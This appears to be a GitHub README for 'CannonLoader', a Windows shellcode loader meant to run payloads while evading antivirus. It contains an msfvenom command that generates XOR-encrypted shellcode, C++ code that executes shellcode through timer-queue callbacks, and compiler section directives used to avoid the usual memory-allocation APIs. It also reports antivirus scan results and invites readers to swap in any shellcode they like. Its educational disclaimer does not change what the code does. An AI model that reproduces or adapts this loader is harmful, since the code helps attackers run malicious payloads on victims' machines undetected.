# CannonLoader

A nice little loader that uses rare methods to execute shellcode.

## Shellcode

Reading the second edition of the Metasploit The Penetration Tester's Guide gave me an idea to come up with a shellcode loader that uses mostly rare and custom methods, for example the msfvenom using mostly unseen flags:
```
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=process -f c -b \x00\x0a\x0d --encrypt xor --encrypt-key racoten --nopsled 500 --sec-name bitdefender
```

## Execution

As well as executing it using TimerQueueTimer APIs to set up the shellcode to be run:
```cpp
 // Start the timer queue
    HANDLE hTimerQueue = pCreateTimerQueue();
    if (!hTimerQueue) {
        return 1;
    }
    
    HANDLE hTimer = NULL;
    if (!pCreateTimerQueueTimer(
        &hTimer,
        hTimerQueue,
        ShellcodeTimerCallback,
        g_execMem,       // Pass pointer to the .myexec buffer
        3000,
        0,
        0))
    {
        pDeleteTimerQueue(hTimerQueue);
        return 1;
    }

    // Wait for user input before cleaning up
    std::cin.get();

    if (hTimer) {
        pDeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
    }
    pDeleteTimerQueue(hTimerQueue);
```

## Management

Through all of this, I made sure to make another custom version of memcpy, mostly because I wanted to try to do one myself:
```cpp
namespace overly_complicated {

    class RawIterator {
    public:
        using iterator_category = std::random_access_iterator_tag;
        using value_type = char;
        using difference_type = std::ptrdiff_t;
        using pointer = char*;
        using reference = char&;

        RawIterator(pointer ptr) : m_ptr(ptr) {}

        reference operator*() const { return *m_ptr; }
        RawIterator& operator++() { ++m_ptr; return *this; }
        RawIterator operator++(int) { RawIterator temp(*this); ++m_ptr; return temp; }
        bool operator==(const RawIterator& other) const { return m_ptr == other.m_ptr; }
        bool operator!=(const RawIterator& other) const { return m_ptr != other.m_ptr; }
        RawIterator& operator+=(difference_type n) { m_ptr += n; return *this; }
        RawIterator operator+(difference_type n) const { return RawIterator(m_ptr + n); }

    private:
        pointer m_ptr;
    };

    void* complicated_memcpy(void* dest, const void* src, std::size_t len) {
        auto validate = [&]() {
            if (!dest || !src) {
                throw std::invalid_argument("cooked");
            }
            };
        validate();

        auto d = static_cast<char*>(dest);
        auto s = static_cast<const char*>(src);

        RawIterator destBegin(d);

        auto copy_operation = [&]() -> RawIterator {
            return std::copy(s, s + len, destBegin);
            };

        RawIterator result = copy_operation();
        return dest;
    }
}
```

## Placement

And finally, the most interesting part, using compiler directives instead of the usual VirtualAlloc and WriteProcessMemory:
```cpp
#ifdef _MSC_VER
#pragma section(".myexec", read, write)
#pragma comment(linker, "/SECTION:.myexec,RW")
__declspec(allocate(".myexec")) static unsigned char g_execMem[sizeof(encryptedPayload)];
#else
static unsigned char g_execMem[sizeof(encryptedPayload)]
__attribute__((section(".myexec"), used));
#endif
```

# Litterbox Results 
<img width="1250" height="675" alt="image" src="https://github.com/user-attachments/assets/6d34f139-41fe-421b-ba05-cf301c1e33de" />

# VirusTotal Results
<img width="1085" height="626" alt="image" src="https://github.com/user-attachments/assets/cdba09f0-2adf-4f3a-b688-0c02f2012307" />

I suspect that VirusTotal engines were able to detect it do to msfvenom's shellcode being hardcoded. But I leave up to you which shellcode you want to use.

# DISCLAIMER

## IMPORTANT: READ CAREFULLY BEFORE USING THIS SOFTWARE

By using this software, you agree to the following terms:

## Purpose of Use
This software is provided strictly for educational purposes only, specifically to help users understand programming techniques, cybersecurity concepts, and software development practices. It is not intended to be used for any malicious, illegal, or unethical activities.

## Prohibited Activities
Any use of this software for the following purposes is explicitly prohibited and is a violation of this agreement:

Exploiting vulnerabilities or gaining unauthorized access to systems, networks, or devices.
Developing or deploying malicious software, such as viruses, trojans, or ransomware.
Engaging in any activities that violate local, national, or international laws or regulations.
Conducting activities that cause harm, disruption, or damage to any individual, organization, or system.

## Liability and Responsibility

The author of this software assumes no liability or responsibility for any damages, losses, or legal consequences resulting from the misuse of this software.
The user is solely responsible for ensuring compliance with all applicable laws and regulations in their jurisdiction. The author disclaims all liability for actions taken by users that violate these laws or this disclaimer.
Acknowledgment of Ethical Use

## By using this software, you acknowledge and agree to:

Use the software in a responsible, ethical, and lawful manner.
Refrain from using the software in any way that could harm individuals, organizations, or infrastructure.
Understand that this software is provided "as is," without any warranty or guarantee of functionality or suitability for any purpose.

## Educational Focus
This software is designed to educate and enhance skills in secure programming, ethical cybersecurity practices, and system understanding. It is intended for use in controlled environments, such as personal research or academic study, where proper authorization has been granted.

By downloading, installing, or using this software, you acknowledge that you have read, understood, and agreed to this disclaimer. If you do not agree with these terms, you are strictly prohibited from using the software and must delete it immediately.
